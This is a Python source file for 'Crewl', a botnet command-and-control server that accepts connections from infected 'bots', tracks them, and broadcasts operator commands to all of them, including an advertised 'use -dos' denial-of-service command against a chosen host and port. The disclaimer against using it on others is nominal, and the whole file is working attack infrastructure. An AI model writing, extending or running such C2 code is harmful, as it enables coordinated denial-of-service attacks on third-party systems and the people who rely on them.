import socket
import threading
import os
import sys
import time


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(("192.168.1.182", 2121))
server_socket.listen(10)


class color:
    END = '\33[0m'
    BOLD = '\33[1m'
    ITALIC = '\33[3m'
    URL = '\33[4m'
    BLINK = '\33[5m'
    BLINK2 = '\33[6m'
    SELECTED = '\33[7m'

    BLACK = '\33[30m'
    RED = '\33[31m'
    GREEN = '\33[32m'
    YELLOW = '\33[33m'
    BLUE = '\33[34m'
    VIOLET = '\33[35m'
    BEIGE = '\33[36m'
    WHITE = '\33[37m'

    BLACKBG = '\33[40m'
    REDBG = '\33[41m'
    GREENBG = '\33[42m'
    YELLOWBG = '\33[43m'
    BLUEBG = '\33[44m'
    VIOLETBG = '\33[45m'
    BEIGEBG = '\33[46m'
    WHITEBG = '\33[47m'

    GREY = '\33[90m'
    RED2 = '\33[91m'
    GREEN2 = '\33[92m'
    YELLOW2 = '\33[93m'
    BLUE2 = '\33[94m'
    VIOLET2 = '\33[95m'
    BEIGE2 = '\33[96m'
    WHITE2 = '\33[97m'

    GREYBG = '\33[100m'
    REDBG2 = '\33[101m'
    GREENBG2 = '\33[102m'
    YELLOWBG2 = '\33[103m'
    BLUEBG2 = '\33[104m'
    VIOLETBG2 = '\33[105m'
    BEIGEBG2 = '\33[106m'
    WHITEBG2 = '\33[107m'


def sysstart():
    banner = f"""
    ▄████▄   ██▀███  ▓█████  █     █░ ██▓    
    ▒██▀ ▀█  ▓██ ▒ ██▒▓█   ▀ ▓█░ █ ░█░▓██▒    
    ▒▓█    ▄ ▓██ ░▄█ ▒▒███   ▒█░ █ ░█ ▒██░    
    ▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓█  ▄ ░█░ █ ░█ ▒██░    
    ▒ ▓███▀ ░░██▓ ▒██▒░▒████▒░░██▒██▓ ░██████▒
    ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░░ ▒░ ░░ ▓░▒ ▒  ░ ▒░▓  ░
      ░  ▒     ░▒ ░ ▒░ ░ ░  ░  ▒ ░ ░  ░ ░ ▒  ░
    ░          ░░   ░    ░     ░   ░    ░ ░   
    ░ ░         ░        ░  ░    ░        ░  ░
    ░                                         
    """

    infobox = f"""
    ----------------------------------------
    |      ● Crewl by Tilman Steck ●      |
    |                                      |
    | version > 1.0                        |
    | donate > https://paypal.com/acc/     |
    |                                      |
    | IMPORTANT: Do not use this against   |
    | other people, just on yourself!      |
    |                                      |
    | Admin User > 'King Crewl'            |
    | bots > 'crewler'                     |
    |                                      |
    ----------------------------------------
    """

    print(color.YELLOW2 + banner)
    print(color.BLUE2 + infobox)
    print("\n[*] Crewl ist starting... \n")


    # setup toolbar
    toolbar_width = 30

    sys.stdout.write(color.BOLD + "[%s]" % (" " * toolbar_width))
    sys.stdout.flush()
    sys.stdout.write("\b" * (toolbar_width + 1))  # return to start of line, after '['

    for i in range(toolbar_width):
        time.sleep(0.2)
        sys.stdout.write("▬")
        sys.stdout.flush()

    sys.stdout.write(color.BOLD + "]\n\n" + color.END)

    time.sleep(2)


def recieve(conn, adress):
    while True:
        if len(botNet) > 0:
            try:
                inmessage = conn.recv(1024).decode()
                print(color.VIOLET2 + "\n'" + inmessage + "' from '" + str(adress) + "'")

                continue

            except socket.error as e:
                print(color.RED2 + "[*] Bot " + str(adress) + "disconnected with error " + str(e))
                remove(conn)
                break

            except KeyboardInterrupt:
                sys.exit()

        elif len(botNet) == 0:
            print(color.RED2 + "[*] There aren't any bots online. System is stopping now!" + color.END)
            sys.exit()


def connect():
    while True:

        connection, addr = server_socket.accept()
        botNet.append(connection)

        print(color.GREEN2 + "[*] Bot connected with address " + str(addr))

        r = threading.Thread(target=recieve, args=(connection, addr))
        r.start()

        continue


def botnetcommand(command):
    for client in botNet:
        try:
            client.send(command.encode())
            pass

        except socket.error:
            remove(client)


def remove(conn):
    if conn in botNet:
        botNet.remove(conn)


sysstart()

botNet = []

t = threading.Thread(target=connect)
t.start()

time.sleep(1)

print(color.BLUE2 + "[*] Acitve bots: " + str(len(botNet)) + "\n")

while True:
    try:
        header = f"""\n{color.YELLOW2}{os.getlogin()}@crewl$ """

        cmdinput = input(header)

        if len(botNet) > 0:
            if cmdinput == "use" or cmdinput == "use -dos":
                print(color.RED2 + "[*] Error: Correct usage: use -dos (host) (port) (number of attacks)")

            else:
                botnetcommand(cmdinput)
                time.sleep(0.8)

            continue

        elif len(botNet) == 0:
            print(color.RED2 + "[*] There are not enough crewler online, try agian later!")

            continue

    except socket.error:
        continue

    except KeyboardInterrupt:
        print(color.RED2 + "[*] Keyboard Interrupt! Stopping system" + color.END)
        os._exit(1)


# socket connect/deconnect ohne error
# mehr befehle
# bot optimieren
# \n einfügen
